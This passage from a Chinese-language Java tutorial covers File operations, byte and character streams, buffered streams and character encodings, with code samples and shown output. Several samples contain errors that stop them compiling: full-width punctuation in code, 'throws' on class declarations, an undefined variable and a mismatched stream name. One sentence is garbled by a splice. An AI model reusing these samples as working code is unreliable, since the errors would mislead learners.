    }
}
输出结果：
D:\bbb.java
D:\idea_project_test4\bbb.java
```

##### 9.2.3 判断功能的方法

- `public boolean exists()` ：此File表示的文件或目录是否实际存在。
- `public boolean isDirectory()` ：此File表示的是否为目录。
- `public boolean isFile()` ：此File表示的是否为文件。

方法演示，代码如下：

```java
public class FileIs {
    public static void main(String[] args) {
        File f = new File("d:\\aaa\\bbb.java");
        File f2 = new File("d:\\aaa");
      	// 判断是否存在
        System.out.println("d:\\aaa\\bbb.java 是否存在:"+f.exists());
        System.out.println("d:\\aaa 是否存在:"+f2.exists());
      	// 判断是文件还是目录
        System.out.println("d:\\aaa 文件?:"+f2.isFile());
        System.out.println("d:\\aaa 目录?:"+f2.isDirectory());
    }
}
输出结果：
d:\aaa\bbb.java 是否存在:true
d:\aaa 是否存在:true
d:\aaa 文件?:false
d:\aaa 目录?:true
```

##### 9.2.4 创建删除功能的方法

- `public boolean createNewFile()` ：当且仅当具有该名称的文件尚不存在时，创建一个新的空文件。 
- `public boolean delete()` ：删除由此File表示的文件或目录。  
- `public boolean mkdir()` ：创建由此File表示的目录。
- `public boolean mkdirs()` ：创建由此File表示的目录，包括任何必需但不存在的父目录。

方法演示，代码如下：

```java
public class FileCreateDelete {
    public static void main(String[] args) throws IOException {
        // 文件的创建
        File f = new File("aaa.txt");
        System.out.println("是否存在:"+f.exists()); // false
        System.out.println("是否创建:"+f.createNewFile()); // true
        System.out.println("是否存在:"+f.exists()); // true
		
     	// 目录的创建
      	File f2= new File("newDir");	
        System.out.println("是否存在:"+f2.exists());// false
        System.out.println("是否创建:"+f2.mkdir());	// true
        System.out.println("是否存在:"+f2.exists());// true

		// 创建多级目录
      	File f3= new File("newDira\\newDirb");
        System.out.println(f3.mkdir());// false
        File f4= new File("newDira\\newDirb");
        System.out.println(f4.mkdirs());// true
      
      	// 文件的删除
       	System.out.println(f.delete());// true
      
      	// 目录的删除
        System.out.println(f2.delete());// true
        System.out.println(f4.delete());// false
    }
}
```

> API中说明：delete方法，如果此File表示目录，则目录必须为空才能删除。

#### 9.3 目录的遍历

- `public String[] list()` ：返回一个String数组，表示该File目录中的所有子文件或目录。
- `public File[] listFiles()` ：返回一个File数组，表示该File目录中的所有的子文件或目录。  

```java
public class FileFor {
    public static void main(String[] args) {
        File dir = new File("d:\\java_code");
      
      	//获取当前目录下的文件以及文件夹的名称。
		String[] names = dir.list();
		for(String name : names){
			System.out.println(name);
		}
        //获取当前目录下的文件以及文件夹对象，只要拿到了文件对象，那么就可以获取更多信息
        File[] files = dir.listFiles();
        for (File file : files) {
            System.out.println(file);
        }
    }
}
```

> 小贴士：
>
> 调用listFiles方法的File对象，表示的必须是实际存在的目录，否则返回null，无法进行遍历。

### 10、IO

#### 10.1 什么是IO流

 生活中，你肯定经历过这样的场景。当你编辑一个文本文件，忘记了`ctrl+s` ，可能文件就白白编辑了。当你电脑上插入一个U盘，可以把一个视频，拷贝到你的电脑硬盘里。那么数据都是在哪些设备上的呢？键盘、内存、硬盘、外接设备等等。

我们把这种数据的传输，可以看做是一种数据的流动，按照流动的方向，以内存为基准，分为`输入input` 和`输出output` ，即流向内存是输入流，流出内存的输出流。

Java中I/O操作主要是指使用`java.io`包下的内容，进行输入、输出操作。**输入**也叫做**读取**数据，**输出**也叫做作**写出**数据。

#### 10.2 IO的分类

根据数据的流向分为：**输入流**和**输出流**。

* **输入流** ：把数据从`其他设备`上读取到`内存`中的流。 
* **输出流** ：把数据从`内存` 中写出到`其他设备`上的流。

格局数据的类型分为：**字节流**和**字符流**。

* **字节流** ：以字节为单位，读写数据的流。
* **字符流** ：以字符为单位，读写数据的流。

#### 10.3 IO的流向说明图解

![image-20240121200902011](./img/小米虫爬山路-img/image-20240121200902011.png)

#### 10.4 顶级父类们

|            |           **输入流**            |              输出流              |
| :--------: | :-----------------------------: | :------------------------------: |
| **字节流** | 字节输入流<br />**InputStream** | 字节输出流<br />**OutputStream** |
| **字符流** |   字符输入流<br />**Reader**    |    字符输出流<br />**Writer**    |

#### 10.5 字节流

##### 10.5.1 一切皆为字节

一切文件数据(文本、图片、视频等)在存储时，都是以二进制数字的形式保存，都一个一个的字节，那么传输时一样如此。所以，字节流可以传输任意文件数据。在操作流的时候，我们要时刻明确，无论使用什么样的流对象，底层传输的始终为二进制数据。

##### 10.5.2 字节输出流`OutputStream`

`java.io.OutputStream `抽象类是表示字节输出流的所有类的超类，将指定的字节信息写出到目的地。它定义了字节输出流的基本共性功能方法。

* `public void close()` ：关闭此输出流并释放与此流相关联的任何系统资源。  
* `public void flush() ` ：刷新此输出流并强制任何缓冲的输出字节被写出。  
* `public void write(byte[] b)`：将 b.length字节从指定的字节数组写入此输出流。  
* `public void write(byte[] b, int off, int len)` ：从指定的字节数组写入 len字节，从偏移量 off开始输出到此输出流。  
* `public abstract void write(int b)` ：将指定的字节输出流。

> 小贴士：
>
> close方法，当完成流的操作时，必须调用此方法，释放系统资源。

##### 10.5.3 `FileOutPutStream类`

`OutputStream`有很多子类，我们从最简单的一个子类开始。

`java.io.FileOutputStream `类是文件输出流，用于将数据写出到文件。

==**构造方法**==

* `public FileOutputStream(File file)`：创建文件输出流以写入由指定的File对象表示的文件。 
* `public FileOutputStream(String name)`： 创建文件输出流以指定的名称写入文件。  

当你创建一个流对象时，必须传入一个文件路径。该路径下，如果没有这个文件，会创建该文件。如果有这个文件，会清空这个文件的数据。

* 构造举例，代码如下：

```java
public class FileOutputStreamConstructor throws IOException {
    public static void main(String[] args) {
   	 	// 使用File对象创建流对象
        File file = new File("a.txt");
        FileOutputStream fos = new FileOutputStream(file);
      
        // 使用文件名称创建流对象
        FileOutputStream fos = new FileOutputStream("b.txt");
    }
}
```

==**写出字节数据**==

1. **写出字节**：`write(int b)` 方法，每次可以写出一个字节数据，代码使用演示：

```java
public class FOSWrite {
    public static void main(String[] args) throws IOException {
        // 使用文件名称创建流对象
        FileOutputStream fos = new FileOutputStream("fos.txt");     
      	// 写出数据
      	fos.write(97); // 写出第1个字节
      	fos.write(98); // 写出第2个字节
      	fos.write(99); // 写出第3个字节
      	// 关闭资源
        fos.close();
    }
}
输出结果：
abc
```

> 小贴士：
>
> 1. 虽然参数为int类型四个字节，但是只会保留一个字节的信息写出。
> 2. 流操作完毕后，必须释放系统资源，调用close方法，千万记得。

2. **写出字节数组**：`write(byte[] b)`，每次可以写出数组中的数据，代码使用演示：

```java
public class FOSWrite {
    public static void main(String[] args) throws IOException {
        // 使用文件名称创建流对象
        FileOutputStream fos = new FileOutputStream("fos.txt");     
      	// 字符串转换为字节数组
      	byte[] b = "黑马程序员".getBytes();
      	// 写出字节数组数据
      	fos.write(b);
      	// 关闭资源
        fos.close();
    }
}
输出结果：
黑马程序员
```

3. **写出指定长度字节数组**：`write(byte[] b, int off, int len)` ,每次写出从off索引开始，len个字节，代码使用演示：

```java
public class FOSWrite {
    public static void main(String[] args) throws IOException {
        // 使用文件名称创建流对象
        FileOutputStream fos = new FileOutputStream("fos.txt");     
      	// 字符串转换为字节数组
      	byte[] b = "abcde".getBytes();
		// 写出从索引2开始，2个字节。索引2是c，两个字节，也就是cd。
        fos.write(b,2,2);
      	// 关闭资源
        fos.close();
    }
}
输出结果：
cd
```

==**数据追加续写**==

经过以上的演示，每次程序运行，创建输出流对象，都会清空目标文件中的数据。如何保留目标文件中数据，还能继续添加新数据呢？

- `public FileOutputStream(File file, boolean append)`： 创建文件输出流以写入由指定的 File对象表示的文件。  
- `public FileOutputStream(String name, boolean append)`： 创建文件输出流以指定的名称写入文件。  

这两个构造方法，参数中都需要传入一个boolean类型的值，`true` 表示追加数据，`false` 表示清空原有数据。这样创建的输出流对象，就可以指定是否追加续写了，代码使用演示：

```java
public class FOSWrite {
    public static void main(String[] args) throws IOException {
        // 使用文件名称创建流对象
        FileOutputStream fos = new FileOutputStream("fos.txt"，true);     
      	// 字符串转换为字节数组
      	byte[] b = "abcde".getBytes();
		// 写出从索引2开始，2个字节。索引2是c，两个字节，也就是cd。
        fos.write(b);
      	// 关闭资源
        fos.close();
    }
}
文件操作前：cd
文件操作后：cdabcde
```

==**写出换行**==

Windows系统里，换行符号是`\r\n` 。把

以指定是否追加续写了，代码使用演示：

```java
public class FOSWrite {
    public static void main(String[] args) throws IOException {
        // 使用文件名称创建流对象
        FileOutputStream fos = new FileOutputStream("fos.txt");  
      	// 定义字节数组
      	byte[] words = {97,98,99,100,101};
      	// 遍历数组
        for (int i = 0; i < words.length; i++) {
          	// 写出一个字节
            fos.write(words[i]);
          	// 写出一个换行, 换行符号转成数组写出
            fos.write("\r\n".getBytes());
        }
      	// 关闭资源
        fos.close();
    }
}

输出结果：
a
b
c
d
e
```

> * 回车符`\r`和换行符`\n` ：
>   * 回车符：回到一行的开头（return）。
>   * 换行符：下一行（newline）。
> * 系统中的换行：
>   * Windows系统里，每行结尾是 `回车+换行` ，即`\r\n`；
>   * Unix系统里，每行结尾只有 `换行` ，即`\n`；
>   * Mac系统里，每行结尾是 `回车` ，即`\r`。从 Mac OS X开始与Linux统一。

##### 10.5.4 字节输入流`InputStream`

`java.io.InputStream `抽象类是表示字节输入流的所有类的超类，可以读取字节信息到内存中。它定义了字节输入流的基本共性功能方法。

- `public void close()` ：关闭此输入流并释放与此流相关联的任何系统资源。    
- `public abstract int read()`： 从输入流读取数据的下一个字节。 
- `public int read(byte[] b)`： 从输入流中读取一些字节数，并将它们存储到字节数组 b中 。

> 小贴士：
>
> close方法，当完成流的操作时，必须调用此方法，释放系统资源。

##### 10.5.5 FileInputStream类

`java.io.FileInputStream `类是文件输入流，从文件中读取字节。

==**构造方法**==

* `FileInputStream(File file)`： 通过打开与实际文件的连接来创建一个 FileInputStream ，该文件由文件系统中的 File对象 file命名。 
* `FileInputStream(String name)`： 通过打开与实际文件的连接来创建一个 FileInputStream ，该文件由文件系统中的路径名 name命名。  

当你创建一个流对象时，必须传入一个文件路径。该路径下，如果没有该文件,会抛出`FileNotFoundException` 。

- 构造举例，代码如下：

```java
public class FileInputStreamConstructor throws IOException{
    public static void main(String[] args) {
   	 	// 使用File对象创建流对象
        File file = new File("a.txt");
        FileInputStream fos = new FileInputStream(file);
      
        // 使用文件名称创建流对象
        FileInputStream fos = new FileInputStream("b.txt");
    }
}
```

==**读取字节数据**==

1. **读取字节**：`read`方法，每次可以读取一个字节的数据，提升为int类型，读取到文件末尾，返回`-1`，代码使用演示：

```java
public class FISRead {
    public static void main(String[] args) throws IOException{
      	// 使用文件名称创建流对象
       	FileInputStream fis = new FileInputStream("read.txt");
      	// 读取数据，返回一个字节
        int read = fis.read();
        System.out.println((char) read);
        read = fis.read();
        System.out.println((char) read);
        read = fis.read();
        System.out.println((char) read);
        read = fis.read();
        System.out.println((char) read);
        read = fis.read();
        System.out.println((char) read);
      	// 读取到末尾,返回-1
       	read = fis.read();
        System.out.println( read);
		// 关闭资源
        fis.close();
    }
}
输出结果：
a
b
c
d
e
-1
```

循环改进读取方式，代码使用演示：

```java
public class FISRead {
    public static void main(String[] args) throws IOException{
      	// 使用文件名称创建流对象
       	FileInputStream fis = new FileInputStream("read.txt");
      	// 定义变量，保存数据
        int b ；
        // 循环读取
        while ((b = fis.read())!=-1) {
            System.out.println((char)b);
        }
		// 关闭资源
        fis.close();
    }
}
输出结果：
a
b
c
d
e
```

> 小贴士：
>
> 1. 虽然读取了一个字节，但是会自动提升为int类型。
> 2. 流操作完毕后，必须释放系统资源，调用close方法，千万记得。

2. **使用字节数组读取**：`read(byte[] b)`，每次读取b的长度个字节到数组中，返回读取到的有效字节个数，读取到末尾时，返回`-1` ，代码使用演示：

```java
public class FISRead {
    public static void main(String[] args) throws IOException{
      	// 使用文件名称创建流对象.
       	FileInputStream fis = new FileInputStream("read.txt"); // 文件中为abcde
      	// 定义变量，作为有效个数
        int len ；
        // 定义字节数组，作为装字节数据的容器   
        byte[] b = new byte[2];
        // 循环读取
        while (( len= fis.read(b))!=-1) {
           	// 每次读取后,把数组变成字符串打印
            System.out.println(new String(b));
        }
		// 关闭资源
        fis.close();
    }
}

输出结果：
ab
cd
ed
```

错误数据`d`，是由于最后一次读取时，只读取一个字节`e`，数组中，上次读取的数据没有被完全替换，所以要通过`len` ，获取有效的字节，代码使用演示：

```java
public class FISRead {
    public static void main(String[] args) throws IOException{
      	// 使用文件名称创建流对象.
       	FileInputStream fis = new FileInputStream("read.txt"); // 文件中为abcde
      	// 定义变量，作为有效个数
        int len ；
        // 定义字节数组，作为装字节数据的容器   
        byte[] b = new byte[2];
        // 循环读取
        while (( len= fis.read(b))!=-1) {
           	// 每次读取后,把数组的有效字节部分，变成字符串打印
            System.out.println(new String(b，0，len));//  len 每次读取的有效字节个数
        }
		// 关闭资源
        fis.close();
    }
}

输出结果：
ab
cd
e
```

> 小贴士：
>
> 使用数组读取，每次读取多个字节，减少了系统间的IO操作次数，从而提高了读写的效率，建议开发中使用。

#### 10.6 字符流

当使用字节流读取文本文件时，可能会有一个小问题。就是遇到中文字符时，可能不会显示完整的字符，那是因为一个中文字符可能占用多个字节存储。所以Java提供一些字符流类，以字符为单位读写数据，专门用于处理文本文件。

##### 10.6.1 字符输入流`Reader`

`java.io.Reader`抽象类是表示用于读取字符流的所有类的超类，可以读取字符信息到内存中。它定义了字符输入流的基本共性功能方法。

- `public void close()` ：关闭此流并释放与此流相关联的任何系统资源。    
- `public int read()`： 从输入流读取一个字符。 
- `public int read(char[] cbuf)`： 从输入流中读取一些字符，并将它们存储到字符数组 cbuf中 。

##### 10.6.2 `FileReader类`

`java.io.FileReader `类是读取字符文件的便利类。构造时使用系统默认的字符编码和默认字节缓冲区。

> 小贴士：
>
> 1. 字符编码：字节与字符的对应规则。Windows系统的中文编码默认是GBK编码表。
>
>    idea中UTF-8
>
> 2. 字节缓冲区：一个字节数组，用来临时存储字节数据。

==**构造方法**==

- `FileReader(File file)`： 创建一个新的 FileReader ，给定要读取的File对象。   
- `FileReader(String fileName)`： 创建一个新的 FileReader ，给定要读取的文件的名称。  

当你创建一个流对象时，必须传入一个文件路径。类似于FileInputStream 。

- 构造举例，代码如下：

```java
public class FileReaderConstructor throws IOException{
    public static void main(String[] args) {
   	 	// 使用File对象创建流对象
        File file = new File("a.txt");
        FileReader fr = new FileReader(file);
      
        // 使用文件名称创建流对象
        FileReader fr = new FileReader("b.txt");
    }
}
```

==**读取字符数据**==

1. **读取字符**：`read`方法，每次可以读取一个字符的数据，提升为int类型，读取到文件末尾，返回`-1`，循环读取，代码使用演示：

```java
public class FRRead {
    public static void main(String[] args) throws IOException {
      	// 使用文件名称创建流对象
       	FileReader fr = new FileReader("read.txt");
      	// 定义变量，保存数据
        int b ；
        // 循环读取
        while ((b = fr.read())!=-1) {
            System.out.println((char)b);
        }
		// 关闭资源
        fr.close();
    }
}
输出结果：
黑
马
程
序
员
```

> 小贴士：虽然读取了一个字符，但是会自动提升为int类型。

2. **使用字符数组读取**：`read(char[] cbuf)`，每次读取b的长度个字符到数组中，返回读取到的有效字符个数，读取到末尾时，返回`-1` ，代码使用演示：

```java
public class FRRead {
    public static void main(String[] args) throws IOException {
      	// 使用文件名称创建流对象
       	FileReader fr = new FileReader("read.txt");
      	// 定义变量，保存有效字符个数
        int len ；
        // 定义字符数组，作为装字符数据的容器
         char[] cbuf = new char[2];
        // 循环读取
        while ((len = fr.read(cbuf))!=-1) {
            System.out.println(new String(cbuf));
        }
		// 关闭资源
        fr.close();
    }
}
输出结果：
黑马
程序
员序
```

获取有效的字符改进，代码使用演示：

```java
public class FISRead {
    public static void main(String[] args) throws IOException {
      	// 使用文件名称创建流对象
       	FileReader fr = new FileReader("read.txt");
      	// 定义变量，保存有效字符个数
        int len ；
        // 定义字符数组，作为装字符数据的容器
        char[] cbuf = new char[2];
        // 循环读取
        while ((len = fr.read(cbuf))!=-1) {
            System.out.println(new String(cbuf,0,len));
        }
    	// 关闭资源
        fr.close();
    }
}

输出结果：
黑马
程序
员
```

##### 10.6.3 字符输出流`Writer`

`java.io.Writer `抽象类是表示用于写出字符流的所有类的超类，将指定的字符信息写出到目的地。它定义了字节输出流的基本共性功能方法。

- `void write(int c)` 写入单个字符。
- `void write(char[] cbuf) `写入字符数组。 
- `abstract  void write(char[] cbuf, int off, int len) `写入字符数组的某一部分,off数组的开始索引,len写的字符个数。 
- `void write(String str) `写入字符串。 
- `void write(String str, int off, int len)` 写入字符串的某一部分,off字符串的开始索引,len写的字符个数。
- `void flush() `刷新该流的缓冲。  
- `void close()` 关闭此流，但要先刷新它。 

##### 10.6.4 `FileWriter类`

`java.io.FileWriter `类是写出字符到文件的便利类。构造时使用系统默认的字符编码和默认字节缓冲区。

==**构造方法**==

- `FileWriter(File file)`： 创建一个新的 FileWriter，给定要读取的File对象。   
- `FileWriter(String fileName)`： 创建一个新的 FileWriter，给定要读取的文件的名称。  

当你创建一个流对象时，必须传入一个文件路径，类似于FileOutputStream。

- 构造举例，代码如下：

```java
public class FileWriterConstructor {
    public static void main(String[] args) throws IOException {
   	 	// 使用File对象创建流对象
        File file = new File("a.txt");
        FileWriter fw = new FileWriter(file);
      
        // 使用文件名称创建流对象
        FileWriter fw = new FileWriter("b.txt");
    }
}
```

==**基本写出数据**==

**写出字符**：`write(int b)` 方法，每次可以写出一个字符数据，代码使用演示：

```java
public class FWWrite {
    public static void main(String[] args) throws IOException {
        // 使用文件名称创建流对象
        FileWriter fw = new FileWriter("fw.txt");     
      	// 写出数据
      	fw.write(97); // 写出第1个字符
      	fw.write('b'); // 写出第2个字符
      	fw.write('C'); // 写出第3个字符
      	fw.write(30000); // 写出第4个字符，中文编码表中30000对应一个汉字。
      
      	/*
        【注意】关闭资源时,与FileOutputStream不同。
      	 如果不关闭,数据只是保存到缓冲区，并未保存到文件。
        */
        // fw.close();
    }
}
输出结果：
abC田
```

> 小贴士：
>
> 1. 虽然参数为int类型四个字节，但是只会保留一个字符的信息写出。
> 2. 未调用close方法，数据只是保存到了缓冲区，并未写出到文件中。

==**关闭和刷新**==

因为内置缓冲区的原因，如果不关闭输出流，无法写出字符到文件中。但是关闭的流对象，是无法继续写出数据的。如果我们既想写出数据，又想继续使用流，就需要`flush` 方法了。

* `flush`：刷新缓冲区，流对象可以继续使用。
* `close `:先刷新缓冲区，然后通知系统释放资源。流对象不可以再被使用了。

代码使用演示：

```java
public class FWWrite {
    public static void main(String[] args) throws IOException {
        // 使用文件名称创建流对象
        FileWriter fw = new FileWriter("fw.txt");
        // 写出数据，通过flush
        fw.write('刷'); // 写出第1个字符
        fw.flush();
        fw.write('新'); // 继续写出第2个字符，写出成功
        fw.flush();
      
      	// 写出数据，通过close
        fw.write('关'); // 写出第1个字符
        fw.close();
        fw.write('闭'); // 继续写出第2个字符,【报错】java.io.IOException: Stream closed
        fw.close();
    }
}
```

> 小贴士：即便是flush方法写出了数据，操作的最后还是要调用close方法，释放系统资源。

==**写出其他数据**==

1. **写出字符数组** ：`write(char[] cbuf)` 和 `write(char[] cbuf, int off, int len)` ，每次可以写出字符数组中的数据，用法类似FileOutputStream，代码使用演示：

```java
public class FWWrite {
    public static void main(String[] args) throws IOException {
        // 使用文件名称创建流对象
        FileWriter fw = new FileWriter("fw.txt");     
      	// 字符串转换为字节数组
      	char[] chars = "黑马程序员".toCharArray();
      
      	// 写出字符数组
      	fw.write(chars); // 黑马程序员
        
		// 写出从索引2开始，2个字节。索引2是'程'，两个字节，也就是'程序'。
        fw.write(b,2,2); // 程序
      
      	// 关闭资源
        fos.close();
    }
}
```

2. **写出字符串**：`write(String str)` 和 `write(String str, int off, int len)` ，每次可以写出字符串中的数据，更为方便，代码使用演示：

```java
public class FWWrite {
    public static void main(String[] args) throws IOException {
        // 使用文件名称创建流对象
        FileWriter fw = new FileWriter("fw.txt");     
      	// 字符串
      	String msg = "黑马程序员";
      
      	// 写出字符数组
      	fw.write(msg); //黑马程序员
      
		// 写出从索引2开始，2个字节。索引2是'程'，两个字节，也就是'程序'。
        fw.write(msg,2,2);	// 程序
      	
        // 关闭资源
        fos.close();
    }
}
```

3. **续写和换行**：操作类似于FileOutputStream。

```java
public class FWWrite {
    public static void main(String[] args) throws IOException {
        // 使用文件名称创建流对象，可以续写数据
        FileWriter fw = new FileWriter("fw.txt"，true);     
      	// 写出字符串
        fw.write("黑马");
      	// 写出换行
      	fw.write("\r\n");
      	// 写出字符串
  		fw.write("程序员");
      	// 关闭资源
        fw.close();
    }
}
输出结果:
黑马
程序员
```

> 小贴士：字符流，只能操作文本文件，不能操作图片，视频等非文本文件。
>
> 当我们单纯读或者写文本文件时  使用字符流其他情况使用字节流

#### 10.7 缓存流

##### 10.7.1 概述

缓冲流,也叫高效流，是对4个基本的`FileXxx` 流的增强，所以也是4个流，按照数据类型分类：

* **字节缓冲流**：`BufferedInputStream`，`BufferedOutputStream` 
* **字符缓冲流**：`BufferedReader`，`BufferedWriter`

缓冲流的基本原理，是在创建流对象时，会创建一个内置的默认大小的缓冲区数组，通过缓冲区读写，减少系统IO次数，从而提高读写的效率。



##### 10.7.2 字节缓存流

==**构造方法**==

* `public BufferedInputStream(InputStream in)` ：创建一个 新的缓冲输入流。 
* `public BufferedOutputStream(OutputStream out)`： 创建一个新的缓冲输出流。

构造举例，代码如下：

```java
// 创建字节缓冲输入流
BufferedInputStream bis = new BufferedInputStream(new FileInputStream("bis.txt"));
// 创建字节缓冲输出流
BufferedOutputStream bos = new BufferedOutputStream(new FileOutputStream("bos.txt"));
```

==**效率测试**==

查询API，缓冲流读写方法与基本的流是一致的，我们通过复制大文件（375MB），测试它的效率。

1. 基本流，代码如下：

```java
public class BufferedDemo {
    public static void main(String[] args) throws FileNotFoundException {
        // 记录开始时间
      	long start = System.currentTimeMillis();
		// 创建流对象
        try (
        	FileInputStream fis = new FileInputStream("jdk9.exe");
        	FileOutputStream fos = new FileOutputStream("copy.exe")
        ){
        	// 读写数据
            int b;
            while ((b = fis.read()) != -1) {
                fos.write(b);
            }
        } catch (IOException e) {
            e.printStackTrace();
        }
		// 记录结束时间
        long end = System.currentTimeMillis();
        System.out.println("普通流复制时间:"+(end - start)+" 毫秒");
    }
}

十几分钟过去了...
```

2. 缓冲流，代码如下：

```java
public class BufferedDemo {
    public static void main(String[] args) throws FileNotFoundException {
        // 记录开始时间
      	long start = System.currentTimeMillis();
		// 创建流对象
        try (
        	BufferedInputStream bis = new BufferedInputStream(new FileInputStream("jdk9.exe"));
	     BufferedOutputStream bos = new BufferedOutputStream(new FileOutputStream("copy.exe"));
        ){
        // 读写数据
            int b;
            while ((b = bis.read()) != -1) {
                bos.write(b);
            }
        } catch (IOException e) {
            e.printStackTrace();
        }
		// 记录结束时间
        long end = System.currentTimeMillis();
        System.out.println("缓冲流复制时间:"+(end - start)+" 毫秒");
    }
}

缓冲流复制时间:8016 毫秒
```

如何更快呢？

使用数组的方式，代码如下：

```java
public class BufferedDemo {
    public static void main(String[] args) throws FileNotFoundException {
      	// 记录开始时间
        long start = System.currentTimeMillis();
		// 创建流对象
        try (
			BufferedInputStream bis = new BufferedInputStream(new FileInputStream("jdk9.exe"));
		 BufferedOutputStream bos = new BufferedOutputStream(new FileOutputStream("copy.exe"));
        ){
          	// 读写数据
            int len;
            byte[] bytes = new byte[8*1024];
            while ((len = bis.read(bytes)) != -1) {
                bos.write(bytes, 0 , len);
            }
        } catch (IOException e) {
            e.printStackTrace();
        }
		// 记录结束时间
        long end = System.currentTimeMillis();
        System.out.println("缓冲流使用数组复制时间:"+(end - start)+" 毫秒");
    }
}
缓冲流使用数组复制时间:666 毫秒
```

##### 10.7.3 字符缓冲流

==**构造方法**==

* `public BufferedReader(Reader in)` ：创建一个 新的缓冲输入流。 
* `public BufferedWriter(Writer out)`： 创建一个新的缓冲输出流。

构造举例，代码如下：

```java
// 创建字符缓冲输入流
BufferedReader br = new BufferedReader(new FileReader("br.txt"));
// 创建字符缓冲输出流
BufferedWriter bw = new BufferedWriter(new FileWriter("bw.txt"));
```

==**特有方法**==

字符缓冲流的基本方法与普通字符流调用方式一致，不再阐述，我们来看它们具备的特有方法。

* BufferedReader：`public String readLine()`: 读一行文字。 
* BufferedWriter：`public void newLine()`: 写一行行分隔符,由系统属性定义符号。 

`readLine`方法演示，代码如下：

```java
public class BufferedReaderDemo {
    public static void main(String[] args) throws IOException {
      	 // 创建流对象
        BufferedReader br = new BufferedReader(new FileReader("in.txt"));
		// 定义字符串,保存读取的一行文字
        String line  = null;
      	// 循环读取,读取到最后返回null
        while ((line = br.readLine())!=null) {
            System.out.print(line);
            System.out.println("------");
        }
		// 释放资源
        br.close();
    }
}
```

`newLine`方法演示，代码如下：

  ```java
public class BufferedWriterDemo throws IOException {
    public static void main(String[] args) throws IOException  {
      	// 创建流对象
		BufferedWriter bw = new BufferedWriter(new FileWriter("out.txt"));
      	// 写出数据
        bw.write("黑马");
      	// 写出换行
        bw.newLine();
        bw.write("程序");
        bw.newLine();
        bw.write("员");
        bw.newLine();
		// 释放资源
        bw.close();
    }
}
输出效果:
黑马
程序
员
  ```

#### 10.8 转换流

##### 10.8.1 字符编码

计算机中储存的信息都是用二进制数表示的，而我们在屏幕上看到的数字、英文、标点符号、汉字等字符是二进制数转换之后的结果。按照某种规则，将字符存储到计算机中，称为**编码** 。反之，将存储在计算机中的二进制数按照某种规则解析显示出来，称为**解码** 。比如说，按照A规则存储，同样按照A规则解析，那么就能显示正确的文本符号。反之，按照A规则存储，再按照B规则解析，就会导致乱码现象。

编码:字符(能看懂的)--字节(看不懂的)

解码:字节(看不懂的)-->字符(能看懂的)

* **字符编码`Character Encoding`** : 就是一套自然语言的字符与二进制数之间的对应规则。

  编码表:生活中文字和计算机中二进制的对应规则

##### 10.8.2 字符集

* **字符集 `Charset`**：也叫编码表。是一个系统支持的所有字符的集合，包括各国家文字、标点符号、图形符号、数字等。

计算机要准确的存储和识别各种字符集符号，需要进行字符编码，一套字符集必然至少有一套字符编码。常见字符集有ASCII字符集、GBK字符集、Unicode字符集等。

![image-20240205124311673](./img/小米虫爬山路-img/image-20240205124311673.png)

可见，当指定了**编码**，它所对应的**字符集**自然就指定了，所以**编码**才是我们最终要关心的。

* **ASCII字符集** ：
  * ASCII（American Standard Code for Information Interchange，美国信息交换标准代码）是基于拉丁字母的一套电脑编码系统，用于显示现代英语，主要包括控制字符（回车键、退格、换行键等）和可显示字符（英文大小写字符、阿拉伯数字和西文符号）。
  * 基本的ASCII字符集，使用7位（bits）表示一个字符，共128字符。ASCII的扩展字符集使用8位（bits）表示一个字符，共256字符，方便支持欧洲常用字符。
* **ISO-8859-1字符集**：
  * 拉丁码表，别名Latin-1，用于显示欧洲使用的语言，包括荷兰、丹麦、德语、意大利语、西班牙语等。
  * ISO-8859-1使用单字节编码，兼容ASCII编码。
* **GBxxx字符集**：
  * GB就是国标的意思，是为了显示中文而设计的一套字符集。
  * **GB2312**：简体中文码表。一个小于127的字符的意义与原来相同。但两个大于127的字符连在一起时，就表示一个汉字，这样大约可以组合了包含7000多个简体汉字，此外数学符号、罗马希腊的字母、日文的假名们都编进去了，连在ASCII里本来就有的数字、标点、字母都统统重新编了两个字节长的编码，这就是常说的"全角"字符，而原来在127号以下的那些就叫"半角"字符了。
  * **GBK**：最常用的中文码表。是在GB2312标准基础上的扩展规范，使用了双字节编码方案，共收录了21003个汉字，完全兼容GB2312标准，同时支持繁体汉字以及日韩汉字等。
  * **GB18030**：最新的中文码表。收录汉字70244个，采用多字节编码，每个字可以由1个、2个或4个字节组成。支持中国国内少数民族的文字，同时支持繁体汉字以及日韩汉字等。
* **Unicode字符集** ：
  * Unicode编码系统为表达任意语言的任意字符而设计，是业界的一种标准，也称为统一码、标准万国码。
  * 它最多使用4个字节的数字来表达每个字母、符号，或者文字。有三种编码方案，UTF-8、UTF-16和UTF-32。最为常用的UTF-8编码。
  * UTF-8编码，可以用来表示Unicode标准中任何字符，它是电子邮件、网页及其他存储或传送文字的应用中，优先采用的编码。互联网工程工作小组（IETF）要求所有互联网协议都必须支持UTF-8编码。所以，我们开发Web应用，也要使用UTF-8编码。它使用一至四个字节为每个字符编码，编码规则：
    1. 128个US-ASCII字符，只需一个字节编码。
    2. 拉丁文等字符，需要二个字节编码。 
    3. 大部分常用字（含中文），使用三个字节编码。
    4. 其他极少使用的Unicode辅助字符，使用四字节编码。

##### 10.8.3 编码引出的问题

在IDEA中，使用`FileReader` 读取项目中的文本文件。由于IDEA的设置，都是默认的`UTF-8`编码，所以没有任何问题。但是，当读取Windows系统中创建的文本文件时，由于Windows系统的默认是GBK编码，就会出现乱码。

```java
public class ReaderDemo {
    public static void main(String[] args) throws IOException {
        FileReader fileReader = new FileReader("E:\\File_GBK.txt");
        int read;
        while ((read = fileReader.read()) != -1) {
            System.out.print((char)read);
        }
        fileReader.close();
    }
}
输出结果：
���
```

那么如何读取GBK编码的文件呢？ 

##### 10.8.4 InputStreamReader类  

转换流`java.io.InputStreamReader`，是Reader的子类，是从字节流到字符流的桥梁。它读取字节，并使用指定的字符集将其解码为字符。它的字符集可以由名称指定，也可以接受平台的默认字符集。 

==**构造方法**==

* `InputStreamReader(InputStream in)`: 创建一个使用默认字符集的字符流。 
* `InputStreamReader(InputStream in, String charsetName)`: 创建一个指定字符集的字符流。

构造举例，代码如下： 

```java
InputStreamReader isr = new InputStreamReader(new FileInputStream("in.txt"));
InputStreamReader isr2 = new InputStreamReader(new FileInputStream("in.txt") , "GBK");
```

==**指定编码读取**==

```java
public class ReaderDemo2 {
    public static void main(String[] args) throws IOException {
      	// 定义文件路径,文件为gbk编码
        String FileName = "E:\\file_gbk.txt";
      	// 创建流对象,默认UTF8编码
        InputStreamReader isr = new InputStreamReader(new FileInputStream(FileName));
      	// 创建流对象,指定GBK编码
